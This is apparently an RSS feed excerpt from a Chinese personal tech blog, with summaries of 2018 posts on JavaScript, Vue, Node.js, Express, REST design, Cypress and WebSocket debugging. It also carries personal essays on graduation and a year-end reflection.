各种APP, 都在极力的吸引用户多花点时间在自己身上 信息流充斥着各种毫无营养，专门吸人眼球的垃圾新闻，但是这种新闻的阅读量还是蛮大的 各种借钱，信用卡，花呗等都像青楼的小姐，妩媚的笑容，说道：官人，进来做一做 共享单车，在今年退潮之后，才发现自己都在裸泳 比特币，挖矿机。不知道谁割了谁的韭菜，总希望有下一个傻子来接盘，最后发现自己可能就是最后一个傻子 AI，人工智能很火，放佛就快要进入终结者那样的世界 锤子垮了，曾经吹过的牛逼，曾经理想主义终于脱去那又黑又亮的面具 图灵测试（The Turing test）由艾伦·麦席森·图灵发明，指测试者与被测试者（一个人和一台机器）隔开的情况下，通过一些装置（如键盘）向被测试者随意提问。 进行多次测试后，如果有超过30%的测试者不能确定出被测试者是人还是机器，那么这台机器就通过了测试，并被认为具有人类智能。图灵测试一词来源于计算机科学和密码学的先驱阿兰·麦席森·图灵写于1950年的一篇论文《计算机器与智能》，其中30%是图灵对2000年时的机器思考能力的一个预测，目前我们已远远落后于这个预测。
最后说一下图灵测试，在AI方面，这个测试无人不知。一个机器如果通过了图灵测试，则说明该机器具有了只能。但是三体的作者大刘曾经说过一句话，给我一种醍醐灌顶的感觉，假如一个机器人有能力通过图灵测试，却假装无法通过，你说这个机器是否具有人工智能。所以大刘的这种说法才更加让人恐惧。机器人能通过图灵测试，只说明这个机器人具有了智能。但是现阶段的智能只不过是条件反射，或者是基于概率计算的结果。后者这种能通话测试，却假装无法通过的智能。这不仅仅是智能，而是机器的城府。
有智能的机器并不可怕，有城府的机器人才是真正的可怕。
如果梦中更加幸福快乐，为什么要回到现实 火影的最后，大筒木辉夜使用无限月读将世界上的所有人都带入梦境，每个人的查克拉都被吸取，并作为神树的养料。
如果真的存在大筒木这样的上帝，那么时间就是查克拉。人类唯一真正拥有过的东西，时间，将作为神树的养料，从每个人身上提取。
各种具有吸引力的术，其实可以理解为无限月读，让人沉醉于梦幻中。
如果梦中更加幸福快乐，为什么要回到现实中承受压力与悲哀呢？ 目前我无法回复自己的这个问题，期待2019年我可以得到这个答案。
工作方面 2019年，我会在做一些后端方面的工作，努力加油吧。</description>
    </item>
    
    <item>
      <title>深入理解 JavaScript中的变量、值、函数传参</title>
      <link>https://wdd.js.org/posts/2018/deep-in-javascript-variable-value-arguments/</link>
      <pubDate>Mon, 17 Dec 2018 15:24:15 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/deep-in-javascript-variable-value-arguments/</guid>
      <description>1. demo 如果你对下面的代码没有任何疑问就能自信的回答出输出的内容，那么本篇文章就不值得你浪费时间了。
var var1 = 1 var var2 = true var var3 = [1,2,3] var var4 = var3 function test (var1, var3) { var1 = &amp;#39;changed&amp;#39; var3[0] = &amp;#39;changed&amp;#39; var3 = &amp;#39;changed&amp;#39; } test(var1, var3) console.log(var1, var2, var3, var4) 2. 深入理解原始类型 原始类型有5个 Undefinded, Null, Boolean, Number, String
2.1. 原始类型变量没有属性和方法 // 抬杠, 下面的length属性，toString方法怎么有属性和方法呢？ var a = &amp;#39;oooo&amp;#39; a.length a.toString 原始类型中，有三个特殊的引用类型Boolean, Number, String，在操作原始类型时，原始类型变量会转换成对应的基本包装类型变量去操作。参考JavaScript高级程序设计 5.6 基本包装类型。
2.2. 原始类型值不可变 原始类型的变量的值是不可变的，只能给变量赋予新的值。
下面给出例子
// str1 开始的值是aaa var str1 = &amp;#39;aaa&amp;#39; // 首先创建一个能容纳6个字符串的新字符串 // 然后再这个字符串中填充 aaa和bbb // 最后销毁字符串 aaa和bbb // 而不能理解成在str1的值aaa后追加bbb str1 = str1 + &amp;#39;bbb&amp;#39; 其他原始类型的值也是不可变的, 例如数值类型的。</description>
    </item>
    
    <item>
      <title>WTF!! Vue数组splice方法无法正常工作</title>
      <link>https://wdd.js.org/posts/2018/vue-array-splice-not-work/</link>
      <pubDate>Wed, 12 Dec 2018 20:29:16 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/vue-array-splice-not-work/</guid>
      <description>当函数执行到this.agents.splice()时，我设置了断点。发现传参index是0，但是页面上的列表项对应的第一行数据没有被删除，
WTF！！！ 这是什么鬼！然后我打开Vue Devtools, 然后刷新了一下，发现那个数组的第一项还是存在的。什么鬼？？
removeOneAgentByIndex: function (index) { this.agents.splice(index, 1) } 然后我就谷歌了一下，发现这个splice not working properly my object list VueJs, 大概意思是v-for的时候最好给列表项绑定:key=。然后我是试了这个方法，发现没啥作用。
最终我决定，单步调试，如果我发现该问题出在Vue自身，那我就该抛弃Vue, 学习React了
单步调试中出现一个异常的情况，removeOneAgentByIndex是被A函数调用的，A函数由websocket事件驱动。正常情况下应该触发一次的事件，服务端却发送了两次到客户端。由于事件重复，第一次执行A删除时，实际上removeOneAgentByIndex是执行成功了，但是重复的第二个事件到来时，A函数又往agents数组中添加了一项。导致看起来，removeOneAgentByIndex函数执行起来似乎没有设么作用。而且这两个重复的事件是在几乎是在同一时间发送到客户端，所以我几乎花了将近一个小时去解决这个bug。引起这个bug的原因是事件重复，所以我在前端代码中加入事件去重功能，最终解决这个问题。
我记得之前看过一篇文章，一个开发者调通过回调函数计费，回调函数是由事件触发，但是没想到有时候事件会重发，导致重复计费。后来这名开发者在自己的代码中加入事件去重的功能，最终解决了这个问题。
事后总结：我觉得我不该怀疑Vue这种库出现了问题，但是我又不禁去怀疑。
通过这个bug, 我也学到了第二方法，可以删除Vue数组中的某一项，参考下面代码。
// Only in 2.2.0+: Also works with Array + index. removeOneAgentByIndex: function (index) { this.$delete(this.agents, index) } 另外Vue devtools有时候并不会实时的观测到组件属性的变化，即使点了Refresh按钮。如果点了Refresh按钮还不行，那建议你重新打开谷歌浏览器的devtools面板。</description>
    </item>
    
    <item>
      <title>Node.js 如何找出循环依赖的文件？如何解决循环依赖问题？</title>
      <link>https://wdd.js.org/posts/2018/how-to-fix-circular-dependencies-in-node-js/</link>
      <pubDate>Mon, 29 Oct 2018 09:21:03 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/how-to-fix-circular-dependencies-in-node-js/</guid>
      <description>本文重点是讲解如何解决循环依赖这个问题。关心这个问题是如何产生的，可以自行谷歌。
如何重现这个问题 // a.js const {sayB} = require(&amp;#39;./b.js&amp;#39;) sayB() function sayA () { console.log(&amp;#39;say A&amp;#39;) } module.exports = { sayA } // b.js const {sayA} = require(&amp;#39;./a.js&amp;#39;) sayA() function sayB () { console.log(&amp;#39;say B&amp;#39;) } module.exports = { sayB } 执行下面的代码
➜ test git:(master) ✗ node a.js /Users/dd/wj-gitlab/tools/test/b.js:3 sayA() ^ TypeError: sayA is not a function at Object.&amp;lt;anonymous&amp;gt; (/Users/dd/wj-gitlab/tools/test/b.js:3:1) at Module._compile (module.js:635:30) at Object.Module._extensions..js (module.js:646:10) at Module.load (module.js:554:32) at tryModuleLoad (module.</description>
    </item>
    
    <item>
      <title>shields小徽章是如何生成的？以及搭建自己的shield服务器</title>
      <link>https://wdd.js.org/posts/2018/how-to-make-shields-badge/</link>
      <pubDate>Mon, 29 Oct 2018 09:14:43 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/how-to-make-shields-badge/</guid>
      <description>shields小徽章介绍 一般开源项目都会有一些小徽章来标识项目的状态信息，并且这些信息是会自动更新的。在shields的官网https://shields.io/#/, 上面有各种各样的小图标，并且有很多自定义的方案。
起因：如何给私有部署的jenkins制作shields服务？ 私有部署的jenkins是用来打包docker镜像的，而我想获取最新的项目打包的jenkins镜像信息。但是私有的jenkins项目信息，公网的shields服务是无法获取其信息的。那么如果搭建一个私有的shields服务呢？
第一步：如何根据一些信息，制作svg图标 查看shields图标的源码，可以看到这些图标都是svg格式的图标。然后的思路就是，将文字信息转成svg图标。最后我发现这个思路是个死胡同，
有个npm包叫做，text-to-svg, 似乎可以将文本转成svg, 但是看了文本转svg的效果，果断就放弃了。
最后回到起点，看了shields官方仓库，发现一个templates目录，豁然开朗。原来svg图标是由svg的模板生成的，每次生成图标只需要将信息添加到模板中，然后就可以渲染出svg字符串了。
顺着这个思路，发现一个包shields-lightweight
var shields = require(&amp;#39;shields-lightweight&amp;#39;); var svgBadge = shields.svg(&amp;#39;subject&amp;#39;, &amp;#39;status&amp;#39;, &amp;#39;red&amp;#39;, &amp;#39;flat&amp;#39;); 这个包的确可以生成和shields一样的小徽章，但是如果徽章中有中文，那么中文就会溢出。因为一个中文字符的宽度要比一个英文字符宽很多。
所以我就fork了这个项目，重写了图标宽度计算的方式。shields-less
npm install shields-less var shieldsLess = require(&amp;#39;shields-less&amp;#39;) var svgBadge = shieldsLess.svg({ leftText: &amp;#39;npm 黄河远上白云间&amp;#39;, rightText: &amp;#39;hello 世界&amp;#39; }) var svgBadge2 = shieldsLess.svg({ leftText: &amp;#39;npm 黄河远上白云间&amp;#39;, rightText: &amp;#39;hello 世界&amp;#39;, style: &amp;#39;square&amp;#39; }) var svgBadge2 = shieldsLess.svg({ leftText: &amp;#39;npm 黄河远上白云间&amp;#39;, rightText: &amp;#39;hello 世界&amp;#39;, leftColor: &amp;#39;#e64a19&amp;#39;, rightColor: &amp;#39;#448aff&amp;#39;, style: &amp;#39;square&amp;#39; // just two style: square and plat(default) }) 渲染后的效果，查看在线demo: https://wdd.</description>
    </item>
    
    <item>
      <title>Express代理中间件问题与解决方案</title>
      <link>https://wdd.js.org/posts/2018/express-middleware-order-proxy-problem/</link>
      <pubDate>Sun, 30 Sep 2018 09:41:44 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/express-middleware-order-proxy-problem/</guid>
      <description>前后端分离应用的架构 在前后端分离架构中，为了避免跨域以及暴露内部服务地址。一般来说，我会在Express这层中加入一个反向代理。
所有向后端服务访问的请求，都通过代理转发到内部的各个服务。
这个反向代理服务器，做起来很简单。用http-proxy-middleware这个模块，几行代码就可以搞定。
// app.js Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) http-proxy-middleware实际上是对于node-http-proxy的更加简便的封装。node-http-proxy是http-proxy-middleware的底层包，如果node-http-proxy有问题，那么这个问题就会影响到http-proxy-middleware这个包。
最近的bug http-proxy-middleware最近有个问题，请求体在被代理转发前，如果请求体被解析了。那么后端服务将会收不到请求结束的消息，从浏览器的网络面板可以看出，一个请求一直在pending状态。
Cannot proxy after parsing body #299, 实际上这个问题在node-http-proxy也被提出过，而且处于open状态。POST fails/hangs examples to restream also not working #1279
目前这个bug还是处于open状态，但是还是有解决方案的。就是将请求体解析的中间件挂载在代理之后。
下面的代码，express.json()会对json格式的请求体进行解析。方案1在代理前就进行body解析，所有格式是json的请求体都会被解析。
但是有些走代理的请求，如果我们并不关心请求体的内容是什么，实际上我们可以不解析那些走代理的请求。所以，可以先挂载代理中间件，然后挂载请求体解析中间件，最后挂载内部的一些接口服务。
// 方案1 bad app.use(express.json()) Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) app.use(&amp;#39;/api&amp;#39;, (req, res, next)=&amp;gt; { }) // 方案2 good Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) app.use(express.json()) app.use(&amp;#39;/api&amp;#39;, (req, res, next)=&amp;gt; { }) 总结 经过这个问题，我对Express中间件的挂载顺序有了更加深刻的认识。
同时，在使用第三方包的过程中，如果该包bug，那么也需要自行找出合适的解决方案。而这个能力，往往就是高手与新手的区别。</description>
    </item>
    
    <item>
      <title>IE11跨域检查跨域设置</title>
      <link>https://wdd.js.org/posts/2018/ie-cross-domain-settings/</link>
      <pubDate>Thu, 23 Aug 2018 10:20:10 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/ie-cross-domain-settings/</guid>
      <description>IE11有安全设置中有两个选项，
跨域浏览窗口和框架 通过域访问数据源 如果上面两个选项被禁用，那么IE11会拒绝跨域请求。如果想要跨域成功，必须将上面两个选项设置为启用。
第一步 打开IE11 点击浏览器右上角的齿轮图标 点击弹框上的 Internet选项 第二步 点击安全 点击Internet 点击自定义级别 第三步 找到跨域浏览窗口和框架
如果这项是禁用的，那么要勾选启用。
找到通过域访问数据源
如果这项是禁用的，那么要勾选启用。
最后在点击确定。
最后，如果跨域浏览窗口和框架,通过域访问数据源都启用了，还是无法跨域。那么最好重启一下电脑。有些设置可能在重启后才会生效。</description>
    </item>
    
    <item>
      <title>毕业后，青春像一艘船，沉入海底</title>
      <link>https://wdd.js.org/posts/2018/the-rest-of-your-life/</link>
      <pubDate>Tue, 14 Aug 2018 18:36:40 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/the-rest-of-your-life/</guid>
      <description>大三那年的暑假 大三那年暑假，很多同学都回去了，寝室大楼空空如也。
留在上海的同学都在各自找着兼职的工作，为了不显得无聊，我也在网上随便发了一些简历，试试看运气。
写简历最难写的部分就是写你自己的长处是什么？搜索枯肠，觉得自己似乎也没什特长。感觉大学三年学到一些东西，又感觉什么都没学到。
如果没有特长，总该也有点理想吧，比如想干点什么？ 似乎我也没什么想做的事情。
小时候我们都有理想，慢慢长大后，理想越来越模糊，变得越来越迷茫。
大学里，大部分的人都是在打游戏。我也曾迷恋过打游戏，但是因为自己比较菜，总是被虐，所以放弃了。
但是我也不是那种天天对着笔记本看电视剧的人。
回忆初三那年的暑假 记得，初三的暑假，我参加了一个学校看展的一个免费的计算机培训班。因为培训的老师说，培训结束前会有一个测试，成绩最好的会有几百块的奖励。
为了几百块的奖励，我第一个背诵完五笔拆字法。随后老师教了我们PS, 就是photoshop。当时我的理解就是，ps可以做出很多搞笑的图片。
为了成为一个有能力做出搞笑图片的人。我在高中和大学期间，断断续续的系统的自学了PS。
下面给展示几张我的PS照片
【毕业照】
【帮别人做的艺术照】
【刺客信条 换脸 我自己】
【旅游照 换脸 我自己】
【宿舍楼 上面ps了一条狼】
古玩艺术电商中的店小二 基本上，我的PS技术还是能够找点兼职做的。没过多久，我收到了面试邀请，面试的公司位于一个古玩收藏品市场中。
当然我面试成功了，开出的日薪也是非常诱人，每天35元。
在上海，35元一天的工资，除去来回上下班做地铁和公交，还有中午饭的费用外，基本上不会剩下什么，有时候稍微午饭丰盛点，自己就要倒贴。但是这也是一次不错的尝试，至少有史以来，除去父母以外，我用能力问别人要钱了。
35元的日薪持续很短一段时间，然后我就涨薪了，到达每天100元。在这个做兼职的地方，我最高拿到的日薪是200元。
兼职期间我做了各式各样的工作：
古玩艺术品摄影 海报制作 拍卖图册制作 linux运维 APP UI 设计 网页设计 python爬虫 兼职的日志过得很苦，单是还算充实。虽然工资不高，但是因为还没毕业，也没有奢望过高的工资。
【上图 我在一个古玩店的拍摄玉器的时候，有个小女孩过来找我玩，我随手拍的】
【上图 是在1号线 莲花路地铁站 因为错过了地铁拍的】
【上图 是从1号线 莲花地铁站 转公交拍的】
【每天早上起的很早，能够看到军训的学生在操场上奔跑】
【在古玩店一般都要拍到很晚，因为是按张数算拍照工资，拍的越多，工资越高。还好晚上回公司 打车费用是可以报销的】
【晚上还要回到学校，一般到学校就快晚上10点左右了】
【毕业了，新校区依然很漂亮】
【毕业了，老校区下了一场雨】
【毕业了，青春像一艘船，沉入海底】
【毕业了，我等的人，你在哪里？】</description>
    </item>
    
    <item>
      <title>NodeJS Events 模块笔记</title>
      <link>https://wdd.js.org/posts/2018/deepin-nodejs-events/</link>
      <pubDate>Fri, 10 Aug 2018 10:18:57 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/deepin-nodejs-events/</guid>
      <description>1. 环境 node 8.11.3 2. 基本使用 // 01.js const EventEmitter = require(&amp;#39;events&amp;#39;); class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter(); myEmitter.on(&amp;#39;event&amp;#39;, () =&amp;gt; { console.log(&amp;#39;an event occurred!&amp;#39;); }); myEmitter.emit(&amp;#39;event&amp;#39;); 输出：
an event occurred! 3. 传参与this指向 emit()方法可以传不限制数量的参数。 除了箭头函数外，在回调函数内部，this会被绑定到EventEmitter类的实例上 // 02.js const EventEmitter = require(&amp;#39;events&amp;#39;) class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter() myEmitter.on(&amp;#39;event&amp;#39;, function (a, b){ console.log(a, b, this, this === myEmitter) }) myEmitter.on(&amp;#39;event&amp;#39;, (a, b) =&amp;gt; { console.</description>
    </item>
    
    <item>
      <title>JavaScript动态下载文件</title>
      <link>https://wdd.js.org/posts/2018/js-download-file/</link>
      <pubDate>Wed, 27 Jun 2018 09:09:01 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/js-download-file/</guid>
      <description>需求描述 可以把字符串下载成txt文件 可以把对象序列化后下载json文件 下载由ajax请求返回的Excel, Word, pdf 等等其他文件 基本思想 downloadJsonIVR () { var data = {name: &amp;#39;age&amp;#39;} data = JSON.stringify(data) data = new Blob([data]) var a = document.createElement(&amp;#39;a&amp;#39;) var url = window.URL.createObjectURL(data) a.href = url a.download = &amp;#39;what-you-want.json&amp;#39; a.click() }, 从字符串下载文件 从ajax请求中下载文件 </description>
    </item>
    
    <item>
      <title>Restful API 架构思考</title>
      <link>https://wdd.js.org/posts/2018/think-about-restful-api/</link>
      <pubDate>Thu, 07 Jun 2018 22:35:08 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/think-about-restful-api/</guid>
      <description>1. 什么是REST? 2. REST API最为重要的约束 3. REST API HTTP方法 与 CURD 4. 状态码 5. RESTful架构设计 6. 文档 7. 版本 8. 深入理解状态与无状态 9. 参考 1. 什么是REST? 表现层状态转换（REST，英文：Representational State Transfer）是Roy Thomas Fielding博士于2000年在他的博士论文[1] 中提出来的一种万维网软件架构风格，目的是便于不同软件/程序在网络（例如互联网）中互相传递信息。表现层状态转换（REST，英文：Representational State Transfer）是根基于超文本传输协议(HTTP)之上而确定的一组约束和属性，是一种设计提供万维网络服务的软件构建风格。匹配或兼容于这种架构风格(简称为 REST 或 RESTful)的网络服务，允许客户端发出以统一资源标识符访问和操作网络资源的请求，而与预先定义好的无状态操作集一致化。wikipdeia
REST API 不是一个标准或者一个是协议，仅仅是一种风格，一种style。
RESTful API的简单定义可以轻松解释这个概念。 REST是一种架构风格，RESTful是它的解释。也就是说，如果您的后端服务器具有REST API，并且您（从网站/应用程序）向客户端请求此API，则您的客户端为RESTful。
2. REST API最为重要的约束 Client-Server 通信只能由客户端单方面发起，表现为请求-响应的形式 Stateless 通信的会话状态（Session State）应该全部由客户端负责维护 Cache 响应内容可以在通信链的某处被缓存，以改善网络效率 Uniform Interface 通信链的组件之间通过统一的接口相互通信，以提高交互的可见性 Layered System 通过限制组件的行为（即每个组件只能“看到”与其交互的紧邻层），将架构分解为若干等级的层。 Code-On-Demand 支持通过下载并执行一些代码（例如Java Applet、Flash或JavaScript），对客户端的功能进行扩展。 3. REST API HTTP方法 与 CURD REST API 使用POST，GET, PUT, DELETE的HTTP方法来描述对资源的增、查、改、删。 这四个HTTP方法在数据层对应着SQL的插入、查询、更新、删除操作。</description>
    </item>
    
    <item>
      <title>记一次如何解决谷歌浏览器占用过高cpu问题过程</title>
      <link>https://wdd.js.org/posts/2018/how-to-fix-google-chrome-very-high-cpu-cost/</link>
      <pubDate>Mon, 04 Jun 2018 17:58:24 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/how-to-fix-google-chrome-very-high-cpu-cost/</guid>
      <description>1. 问题现象 有时候发现mac风扇响的厉害，于是我检查了mac系统的活动监视器，发现Google Chrome Helper占用99%的CPU。
通常来说Chrome如果占用过高的内存，这并不是什么问题，毕竟Chrome的性能以及易用性是建立在占用很多内存的基础上的。但是无论什么程序，持续的占用超过80%的cpu，都是极不正常的。大多数程序都是占用维持在低于10%的CPU。
活动监视器指出问题出现在Chrome浏览器。那么问题可以再次细分为三块。
Chrome系统自身问题 一些插件，例如flash插件，扩展插件 网页程序js出现的问题 2. 从任务管理器着手 其实Chrome浏览器自身也是有任务管理器的，一般来说windows版chrome按住shift+esc就会调出任务管理器窗口。mac版调出任务管理器没有快捷，只能通过Window &amp;gt; Task Manager调出。
调出任务管理器后，发现一个标签页，CPU占用率达到99%， 那就说明，应该是这个标签页中存在持续占用大量CPU计算的程序。
最后找到这个页面，发现该页面背景图是一种动态粒子图。就是基于particles.js做的。我想，终于找到你了。
于是我把这个动态图的相关js代码给注释掉，电脑的风扇也终于变得安静了。
3. 问题总结 问题解决的总结：解决问题的方法时很简单的，基于一个现象，找到一个原因，基于这个原因再找到一个现象，然后一步一步缩小问题范围，逼近最终原因。
机器CPU过高，一般都是可以从任务管理器着手解决。系统的任务管理器可以监控各个程序占用的CPU是否正常，通常程序自身也是有任务管理的。
像谷歌浏览器这种软件，几乎本身就是一个操作系统，所以说它的任务管理器也是必不可少的。Chrome浏览器再带的任务管理器可以告诉你几个关键信息。
任务占用的内存 任务占用的CPU 任务占用的网络流量大小 如果你一打开谷歌浏览器，你的电脑风扇就拼命转，那你最好打开谷歌浏览器的任务管理器看看。
4. 关于动态背景图的思考 动态背景图往往都会给人很酷炫的感觉，但是这种背景图的制作并不是很复杂，如果你使用particles.js来制作，制作一些动态背景图只需要几行代码就可以搞定。但是这种酷炫的背后，CPU也在承受着压力。
particles.js提供的demo效果图，在Chrome中CPU会被提高到100%。
也有几家使用动态背景图的官网。我记得知乎以前就用过动态背景图，但是现在找不到了。另外一个使用动态背景图的是daocloud, CPU也是会在首页飙升到50%。
所谓：强招必自损，动态背景图在给人以炫酷科技感的同时，也需要权衡这种技术对客户计算机的压力。
另外，不要小看JavaScript, 它也可能引起大问题</description>
    </item>
    
    <item>
      <title>IE浏览器不支持location.origin</title>
      <link>https://wdd.js.org/posts/2018/ie-not-support-location-origin/</link>
      <pubDate>Thu, 24 May 2018 14:50:49 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/ie-not-support-location-origin/</guid>
      <description>某些IE浏览器location.origin属性是undefined，所以如果你要使用该属性，那么要注意做个能力检测。
if (!window.location.origin) { window.location.origin = window.location.protocol + &amp;#34;//&amp;#34; + window.location.hostname + (window.location.port ? &amp;#39;:&amp;#39; + window.location.port: &amp;#39;&amp;#39;); }i </description>
    </item>
    
    <item>
      <title>端到端测试哪家强？不容错过的Cypress</title>
      <link>https://wdd.js.org/posts/2018/e2e-testing-hacker-news-with-cypress/</link>
      <pubDate>Mon, 14 May 2018 10:43:02 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/e2e-testing-hacker-news-with-cypress/</guid>
      <description>1. 目前E2E测试工具有哪些？ 项目 Web Star puppeteer Chromium (~170Mb Mac, ~282Mb Linux, ~280Mb Win) 31906 nightmare Electron 15502 nightwatch WebDriver 8135 protractor selenium 7532 casperjs PhantomJS 7180 cypress Electron 5303 Zombie 不需要 4880 testcafe 不需要 4645 CodeceptJS webdriverio 1665 端到端测试一般都需要一个Web容器，来运行前端应用。例如Chromium, Electron, PhantomJS, WebDriver等等。
从体积角度考虑，这些Web容器体积一般都很大。
从速度的角度考虑：PhantomJS, WebDriver &amp;lt; Electon, Chromium。
而且每个工具的侧重点也不同，建议按照需要去选择。
2. 优秀的端到端测试工具应该有哪些特点？ 安装简易：我希望它非常容易安装，最好可以一行命令就可以安装完毕 依赖较少：我只想做个E2E测试，不想安装jdk, python之类的东西 速度很快：运行测试用例的速度要快 报错详细：详细的报错 API完备：鼠标键盘操作接口，DOM查询接口等 Debug方便：出错了可以很方便的调试，而不是去猜 3. 为什么要用Cypress？ Cypress基本上拥有了上面的特点之外，还有以下特点。
时光穿梭 测试运行时，Cypress会自动截图，你可以轻易的查看每个时间的截图 Debug友好 不需要再去猜测为什么测试有失败了，Cypress提供Chrome DevTools, 所以Debug是非常方便的。 实时刷新 Cypress检测测试用例改变后，会自动刷新 自动等待 不需要在使用wait类似的方法等待某个DOM出现，Cypress会自动帮你做这些 Spies, stubs, and clocks Verify and control the behavior of functions, server responses, or timers.</description>
    </item>
    
    <item>
      <title>掌握谷歌搜索高级指令</title>
      <link>https://wdd.js.org/posts/2018/master-google-search-command/</link>
      <pubDate>Thu, 26 Apr 2018 16:56:01 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/master-google-search-command/</guid>
      <description>1. 谷歌搜索指令 2. 基本命令 3. 关键词使用 4. 特殊工具 4.1. define 快速返回关键词定义 4.2. 计算器 4.3. 单位转换 4.4. 时区查询 4.5. 地区查询 4.6. 天气查询 5. 参考 1. 谷歌搜索指令 2. 基本命令 符号 简介 语法 注意点 示例 | 包含A且必须包含B | A +B | A和+之间有空格 | Maxwell +wills | 包含A且不包含B | A -B | A和+之间有空格 | Maxwell -Absolom &amp;quot; &amp;quot; | 完整匹配AB | &amp;ldquo;AB&amp;rdquo; | | &amp;ldquo;Thomas Jefferson&amp;rdquo; OR | 包含A或者B | A OR B 或者 A | B | | nodejs OR webpack +-&amp;ldquo;OR | 指令可以组合，完成更复杂的查询 | | | beach -sandy +albert +nathaniel ~ | 包含A, 并且包含B的近义词 | A ~B | | github ~js .</description>
    </item>
    
    <item>
      <title>金钱游戏 - 银行造钱的秘密</title>
      <link>https://wdd.js.org/posts/2018/the-secret-of-bank-create-money/</link>
      <pubDate>Wed, 25 Apr 2018 13:33:52 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/the-secret-of-bank-create-money/</guid>
      <description>1. 角色划分 名称 角色 账户 A 银行家 0 B 建筑商 100万 C 商人 0 2. 建筑商向银行存储100万 名称 角色 账户 A 银行家 100万 现金 B 建筑商 100万 支票 C 商人 0 2. 商人向银行贷款100万 此时银行的账户存款已经是0了，但是B还在银行存了100万。那银行究竟是还有100万呢, 还是一毛都没有了呢。
此时建筑商如果要取现金，那么银行马上就要破产。
名称 角色 账户 A 银行家 100现金 B 建筑商 100万 支票 C 商人 100万 支票 3. 商人需要建筑商来建造房子 商人需要建筑商来建筑房子，费用是100万，付给建筑商，建筑商又把100支票存到银行
名称 角色 账户 A 银行家 100万现金 B 建筑商 200万 支票 C 商人 0 商人又从银行借钱100万，来付给建筑商建房子，建筑商把钱存到银行
名称 角色 账户 A 银行家 100万现金 B 建筑商 300万 支票 C 商人 0 只要这个循环还在继续，你会发现，建筑商的账面上的支票越来越多，但是银行始终都是100万现金存在那里，从来都没动过。</description>
    </item>
    
    <item>
      <title>Express静态文件浏览器缓存设置与缓存清除</title>
      <link>https://wdd.js.org/posts/2018/express-static-file-cache-setting-and-cleaning/</link>
      <pubDate>Sun, 08 Apr 2018 09:00:48 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/express-static-file-cache-setting-and-cleaning/</guid>
      <description>1. Express设置缓存 Express设置静态文件的方法很简单，一行代码搞定。app.use(express.static(path.join(__dirname, &#39;public&#39;), {maxAge: MAX_AGE})), 注意MAX_AGE的单位是毫秒。这句代码的含义是让pulic目录下的所有文件都可以在浏览器中缓存，过期时长为MAX_AGE毫秒。
app.use(express.static(path.join(__dirname, &amp;#39;public&amp;#39;), {maxAge: config.get(&amp;#39;maxAge&amp;#39;)})) 2. Express让浏览器清除缓存 缓存的好处是可以更快的访问服务，但是缓存也有坏处。例如设置缓存为10天，第二天的时候服务更新了。如果客户端不强制刷新页面的话，浏览器会一致使用更新前的静态文件，这样会导致一些BUG。你总当每次出问题时，客户打电话给你后，你让他强制刷新浏览器吧？
所以，最好在服务重启后，重新让浏览器获取最新的静态文件。
设置的方式是给每一个静态文件设置一个时间戳。
例如：vendor/loadjs/load.js?_=123898923423&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
2.1. Express 路由 // /routes/index.js router.get(&amp;#39;/home&amp;#39;, function (req, res, next) { res.render(&amp;#39;home&amp;#39;, {config: config, serverStartTimestamp: new Date().getTime()}) }) 2.2. 视图文件 // views/home.html &amp;lt;script src=&amp;#34;vendor/loadjs/load.js?_=&amp;lt;%= serverStartTimestamp %&amp;gt;&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 设置之后，每次服务更新或者重启，浏览器都会使用最新的时间戳serverStartTimestamp，去获取静态文件。
2.3. 动态加载JS文件 有时候js文件并不是直接在HTML中引入，可能是使用了一些js文件加载库，例如requirejs, LABjs等。这些情况下，可以在全局设置环境变量SERVER_START_TIMESTAMP，用来表示服务启动的时间戳，在获取js的时候，将该时间戳拼接在路径上。
注意：环境变量SERVER_START_TIMESTAMP，一定要在其他脚本使用前定义。
// views/home.html &amp;lt;script&amp;gt; var SERVER_START_TIMESTAMP = &amp;lt;%= serverStartTimestamp %&amp;gt; &amp;lt;/script&amp;gt; // load.js &amp;#39;vendor/contact-center/skill.js?_=&amp;#39; + SERVER_START_TIMESTAMP </description>
    </item>
    
    <item>
      <title>WebSocket断开原因分析</title>
      <link>https://wdd.js.org/posts/2018/websocket-close-reasons/</link>
      <pubDate>Thu, 29 Mar 2018 20:35:38 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/websocket-close-reasons/</guid>
      <description>1. 把错误打印出来 WebSocket断开的原因有很多，最好在WebSocket断开时，将错误打印出来。
在线demo地址：https://wdd.js.org/websocket-demos/
ws.onerror = function (e) { console.log(&amp;#39;WebSocket发生错误: &amp;#39; + e.code) console.log(e) } 如果你想自己玩玩WebSocket, 但是你又不想自己部署一个WebSocket服务器，你可以使用ws = new WebSocket(&#39;wss://echo.websocket.org/&#39;), 你向echo.websocket.org发送消息，它会回复你同样的消息。
2. 重要信息错误状态码 WebSocket断开时，会触发CloseEvent, CloseEvent会在连接关闭时发送给使用 WebSockets 的客户端. 它在 WebSocket 对象的 onclose 事件监听器中使用。CloseEvent的code字段表示了WebSocket断开的原因。可以从该字段中分析断开的原因。
3. 关闭状态码表 一般来说1006的错误码出现的情况比较常见，该错误码一般出现在断网时。
